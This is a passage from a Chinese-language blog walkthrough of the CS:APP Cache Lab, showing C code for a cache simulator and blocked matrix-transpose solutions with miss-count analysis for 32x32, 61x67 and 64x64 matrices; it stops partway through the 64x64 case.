     cl-&gt;valid = <span class="number">1</span>;</span><br><span class="line">        cl-&gt;tag = tag;</span><br><span class="line">        cl-&gt;age = age;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 未命中,没有空块</span></span><br><span class="line">    find_evict_cache_line(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// ecvit</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        cache_line *cl = &amp;cache_set-&gt;lines[cl_idx];</span><br><span class="line">        cl-&gt;tag = tag;</span><br><span class="line">        cl-&gt;age = age;</span><br><span class="line">        evicts++;</span><br><span class="line">        DEBUG_EVICT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_store</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">int</span> age)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> verbose = p-&gt;v;</span><br><span class="line">    <span class="keyword">size_t</span> cl_idx;</span><br><span class="line">    <span class="comment">// 是否hit</span></span><br><span class="line">    check_if_hit(cache_set, p, tag, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 命中</span></span><br><span class="line">    &#123;</span><br><span class="line">        hits++;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 是否有空块</span></span><br><span class="line">    check_has_empty_block(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 空块</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].valid = <span class="number">1</span>;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// evcit</span></span><br><span class="line">    find_evict_cache_line(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// evcit</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        evicts++;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_modify</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">int</span> age)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> verbose = p-&gt;v;</span><br><span class="line">    <span class="keyword">size_t</span> cl_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// hit?</span></span><br><span class="line">    check_if_hit(cache_set, p, tag, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// hit , 之后的store也会hit</span></span><br><span class="line">        hits += <span class="number">2</span>;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 空块</span></span><br><span class="line">    check_has_empty_block(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="comment">// 首先load</span></span><br><span class="line">        cache_set-&gt;lines[cl_idx].valid = <span class="number">1</span>;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        <span class="comment">// 再store</span></span><br><span class="line">        hits++;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// evict</span></span><br><span class="line">    find_evict_cache_line(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="comment">// evict</span></span><br><span class="line">        DEBUG_EVICT(verbose);</span><br><span class="line">        evicts++;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        <span class="comment">// store</span></span><br><span class="line">        hits++;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模拟仿真</span></span><br><span class="line"><span class="comment"> * @param sys_cache</span></span><br><span class="line"><span class="comment"> * @param trace_item</span></span><br><span class="line"><span class="comment"> * @param item_num</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">simulate</span><span class="params">(cache *sys_cache, param *p, trace_item *trace_items, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> item_num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> s = p-&gt;s;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> b = p-&gt;b;</span><br><span class="line"><span class="comment">//    const int E = p-&gt;E;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> tag_bit = OS_PTR_LEN - s - b;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造set tag mask</span></span><br><span class="line">    <span class="comment">// set mask</span></span><br><span class="line">    <span class="keyword">address64_t</span> set_mask = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; s - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        set_mask = set_mask &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// tag mask</span></span><br><span class="line">    <span class="keyword">address64_t</span> tag_mask = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; tag_bit - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        tag_mask = tag_mask &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; item_num; i++) &#123;</span><br><span class="line">        trace_item item = trace_items[i];</span><br><span class="line">        <span class="keyword">address64_t</span> addr = item.addr;</span><br><span class="line">        op_mode mode = item.mode;</span><br><span class="line"><span class="comment">//        int access_size = item.access_size;     // useless</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// step1: 得到set 和 tag</span></span><br><span class="line">        <span class="keyword">int</span> set_idx = addr &gt;&gt; b &amp; set_mask;</span><br><span class="line">        <span class="keyword">int</span> tag = addr &gt;&gt; (b + s);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// step2: 根据操作码来决定具体实施什么样的操作</span></span><br><span class="line">        <span class="keyword">switch</span> (mode) &#123;</span><br><span class="line">            <span class="keyword">case</span> L:</span><br><span class="line">                do_load(&amp;sys_cache-&gt;sets[set_idx], p, tag, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> M:</span><br><span class="line">                do_modify(&amp;sys_cache-&gt;sets[set_idx], p, tag, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> S:</span><br><span class="line">                do_store(&amp;sys_cache-&gt;sets[set_idx], p, tag, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 系统输入参数</span></span><br><span class="line">    param sys_param;</span><br><span class="line">    <span class="comment">// 解析trace file</span></span><br><span class="line">    <span class="keyword">size_t</span> trace_item_len = <span class="number">10</span>;</span><br><span class="line">    trace_item *trace_items = (trace_item *) <span class="built_in">malloc</span>(trace_item_len * <span class="keyword">sizeof</span>(trace_item));</span><br><span class="line">    <span class="comment">// 系统cache</span></span><br><span class="line">    cache sys_cache;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解析参数</span></span><br><span class="line">    ret = parse_input_params(argc, argv, &amp;sys_param);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parse input params failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, usage);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解析trace file</span></span><br><span class="line">    ret = parse_trace_file(&amp;trace_items, &amp;trace_item_len, sys_param.t);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parse trace file failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化系统cache</span></span><br><span class="line">    init_cache(&amp;sys_cache, &amp;sys_param);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 开始仿真</span></span><br><span class="line">    simulate(&amp;sys_cache, &amp;sys_param, trace_items, trace_item_len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印输出</span></span><br><span class="line">    printSummary(hits, miss, evicts);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-第二部分–编写cache友好代码"><a href="#2-第二部分–编写cache友好代码" class="headerlink" title="2. 第二部分–编写cache友好代码"></a>2. 第二部分–编写cache友好代码</h2><p>本题能加强学生对cache的认识，编写cahce友好的代码。原题很简单，就是给一个矩阵A，求其转置。但是有一些额外说明，具体请读writeup。下面是本题的答案要求：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729141941145.png" alt="image-20200729141941145"></p><p>m，代表miss次数。</p><p>本题核心点：</p><ol><li>加强理解直接相联映射</li><li><strong>理解blocking（分块）机制带来的时间局部性提升</strong></li></ol><p>重点：<strong>blocking机制</strong>，一定要理解blocking，请参照： <span class="exturl" data-url="aHR0cDovL2NzYXBwLmNzLmNtdS5lZHUvcHVibGljL3dhc2lkZS93YXNpZGUtYmxvY2tpbmcucGRm" title="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf<i class="fa fa-external-link"></i></span></p><p>在正式解题前，先说下系统的一些参数，最重要的就是cache的组织方式了：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729142729751.png" alt="image-20200729142729751"></p><p>s=5, S=32, 即32组</p><p>E=1， 即每组一个cacheline</p><p>b=5，B=32， 即一个cacheline的block大小为32字节（后面简称cacheline大小为32字节，实际说的是cacheline内部的block大小）</p><p>blocking机制运用到矩阵转置来，即将A分成多个行条带，A行条带扫描。B分为多个块，每个块由多个条带组成，每个B条带按照列扫描。如图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729144043920.png" alt="image-20200729144043920"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729144439379.png" alt="image-20200729144147785"></p><h3 id="1-32x32"><a href="#1-32x32" class="headerlink" title="1. 32x32"></a>1. 32x32</h3><p>一个cacheline 32字节， 一个int 4字节， 则一个cacheline可以放8个int， 矩阵为32x32， 则矩阵一行需要4个cacheline。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729143603293.png" alt="image-20200729143546012"></p><p>现在的问题是如何确定条带的长度。 </p><p>我们知道cpu一次read，都会load一个cache line到cache中。一个cacheline是32字节。如何将条带设置低于32字节，比如12字节，那么32字节中会有20字节无法利用，浪费了一半的cache。如果大于32字节，那扫描一个条带就会触发至少2次load。那是不是设置成32字节就好了？也不是，我们还要考虑A，B的load，store交替过程中，会造成cacheline的overlap（冲突不命中）。为了让你理解这个概念，先看以下面这道题：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729145230952.png" alt="image-20200729145230952" style="zoom:50%;" /><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729145241517.png" alt="image-20200729145241517" style="zoom:50%;" /><p>现在回到我们的题目，我们想要cacheline的利用率高，又不想发生太多cacheline的冲突不命中。观察到在32x32的矩阵中，<strong>每8行重复一个cache空间。</strong>如果一个条带为32字节，即8个矩阵元素，刚好对应了一个cache line大小。所以我们可以设置， A的行扫描条带为8个元素， B的列扫描条带为8个元素，那一个块的宽度呢？显然一个cacheline是32字节，刚好也是8个元素，宽度为8肯定利用率高。</p><p>最终决定的参数：</p><ol><li>A行条带 8元素</li><li>B中一个块的大小为8x8</li></ol><p><strong>另外，miss数计算会在之后给出。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans32_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">32</span>][<span class="number">32</span>], <span class="keyword">int</span> B[<span class="number">32</span>][<span class="number">32</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BSIZE 8</span></span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> 这里采用4循环是为了更好理解“blocking”机制，其实采用3个循环就能做，具体是融合j和k</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k,q;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LEN; i += BSIZE) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; LEN; j += BSIZE) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + BSIZE; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; BSIZE; q++) <span class="comment">// 4. 以最小粒度为单位， 扫描一个条带</span></span><br><span class="line">                &#123;</span><br><span class="line">                    B[i + q][k] = A[k][i + q];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LEN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BSIZE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样写，miss数是300多，而满分要求miss数&lt;300. 继续分析，什么导致了多余的miss？</p><p>cachelab的writeup中，有这样一句话：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729150322560.png" alt="image-20200729150322560"></p><p>对角线？ 是的，对角线上的元素，会发生冲突不命中问题。究其根本，在于我们对A进行了反复读。如何解决？把A的数据放到寄存器就行了。再次回到write u中：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d3314195aa594512d18.png"></p><p>题目要求我们最多不能定义12个局部变量，上述代码仅仅4个。我们还有8个变量没用，最终的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief block size 8</span></span><br><span class="line"><span class="comment"> * miss计算:</span></span><br><span class="line"><span class="comment"> * BSIZE 8， 总共分为了16块， 假设块编号从0开始，由左向右，由上向下。</span></span><br><span class="line"><span class="comment"> * 则左边第一列块中的每一块（块编号为0,4,8,12)miss数为(9+7+7)：</span></span><br><span class="line"><span class="comment"> * 1.第1个9代表 load A的第一个条带(1个miss)+ store B的第一个条带（8个miss）</span></span><br><span class="line"><span class="comment"> * 2.第2个7代表 load A的剩余7列带来的miss</span></span><br><span class="line"><span class="comment"> * 3.第3个7代表，store B的剩余7列带来的miss</span></span><br><span class="line"><span class="comment"> * 具体可参见文件： m32n32-23miss</span></span><br><span class="line"><span class="comment"> * 所以这4个块总miss为：4*(9+7+7) = 92</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 上述说完了最靠左边的一列block，还剩3列block，3*4 = 12个block</span></span><br><span class="line"><span class="comment"> * 这些block的共性就是 load A条带不会和Store A条带冲突。</span></span><br><span class="line"><span class="comment"> * 所以扫描完一个block会造成的miss为8+8：</span></span><br><span class="line"><span class="comment"> * 1. 第一个8代表，store B的第一个条带（8个miss）</span></span><br><span class="line"><span class="comment"> * 2. 第二个8代表， load 8个A条带带来的miss</span></span><br><span class="line"><span class="comment"> * 所以这12个块总miss为： 12*(8+8) = 192</span></span><br><span class="line"><span class="comment"> * 具体可参见文件：m32n32-16miss</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 另外还有3个固定的额外开销，具体对应哪个cache miss未知，猜测为初始化循环变量带来的（不过又觉得应该不是，如果你知道，还请告诉我）</span></span><br><span class="line"><span class="comment"> * 具体可参见文件：m32n32-extra-miss</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 所以最终的miss为:</span></span><br><span class="line"><span class="comment"> * 92+192+3 = 287</span></span><br><span class="line"><span class="comment"> * @param A </span></span><br><span class="line"><span class="comment"> * @param B </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span> trans32_v1_desc[] = <span class="string">&quot;trans32_v1_desc&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans32_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">32</span>][<span class="number">32</span>], <span class="keyword">int</span> B[<span class="number">32</span>][<span class="number">32</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BSIZE 8</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">int</span> t0, t1, t2, t3, t4, t5, t6, t7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LEN; i += BSIZE) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; LEN; j += BSIZE) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + BSIZE; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 避免对角线的 A B矩阵cacheline竞争</span></span><br><span class="line">                t0 = A[k][i + <span class="number">0</span>];</span><br><span class="line">                t1 = A[k][i + <span class="number">1</span>];</span><br><span class="line">                t2 = A[k][i + <span class="number">2</span>];</span><br><span class="line">                t3 = A[k][i + <span class="number">3</span>];</span><br><span class="line">                t4 = A[k][i + <span class="number">4</span>];</span><br><span class="line">                t5 = A[k][i + <span class="number">5</span>];</span><br><span class="line">                t6 = A[k][i + <span class="number">6</span>];</span><br><span class="line">                t7 = A[k][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line">                B[i + <span class="number">4</span>][k] = t4;</span><br><span class="line">                B[i + <span class="number">5</span>][k] = t5;</span><br><span class="line">                B[i + <span class="number">6</span>][k] = t6;</span><br><span class="line">                B[i + <span class="number">7</span>][k] = t7;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 第二种写法,但是存在对角线竞争</span></span><br><span class="line">                <span class="comment">// for (q = 0; q &lt; BSIZE; q++) // 4. 以最小粒度为单位， 扫描一个条带</span></span><br><span class="line">                <span class="comment">// &#123;</span></span><br><span class="line">                <span class="comment">//     B[i + q][k] = A[k][i + q];</span></span><br><span class="line">                <span class="comment">// &#125;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LEN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BSIZE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>最终的miss数为287</strong>，在代码的注释部分，给出了miss的详细计算方式。</p><h3 id="2-61x67"><a href="#2-61x67" class="headerlink" title="2. 61x67"></a>2. 61x67</h3><p>64x64的最后来说，先把简单的说了来。</p><p>61和67看着不规则比较难，但是题目要求很松，只要低于2000miss即可。</p><p>依然是上面的算法，更改BSIZE, 经测试BSIZE=16就能满足要求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans6761_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">67</span>][<span class="number">61</span>], <span class="keyword">int</span> B[<span class="number">61</span>][<span class="number">67</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 从A矩阵视角</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 67</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BSIZE 16</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k, q;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += BSIZE) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += BSIZE) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + BSIZE; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; BSIZE; q++) <span class="comment">// 4. 以最小粒度为单位， 扫描一个条带</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (k &lt; M &amp;&amp; i + q &lt; N)</span><br><span class="line">                    &#123;</span><br><span class="line">                        B[i + q][k] = A[k][i + q];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> N</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> M</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BSIZE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>最终的miss为1817</strong></p><h3 id="3-64x64"><a href="#3-64x64" class="headerlink" title="3. 64x64"></a>3. 64x64</h3><p>64x64则难很多了，如果依然照搬上面的算法，最终的miss应该是1800多，离满分1300还差很远。来分析下原因：</p><ol><li>如果BSIZE 依然取8会发生什么问题？</li></ol><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d5b14195aa594514cfb.png" alt="image-20200729151739512"></p><p>上图给出了此时的矩阵内部cacheline分布，有个很严重的问题在于一个cache空间，在矩阵中仅4行就重复了。那如果条带继续为8， B列向扫描一个条带，后4个元素就会替换前4个元素所在的cacheline。造成过多<strong>冲突不命中</strong>。</p><ol start="2"><li>那，如果将BSIZE设置为4呢？</li></ol><p>实际上，采用同样的算法，BSIZE=4,的确是最优的了。但是设置为4又会带来什么缺点？<strong>cacheline的利用率仅有一半</strong>。 一个cacheline 32字节，可装载8个元素，但实际只是用了4个元素。</p><ol 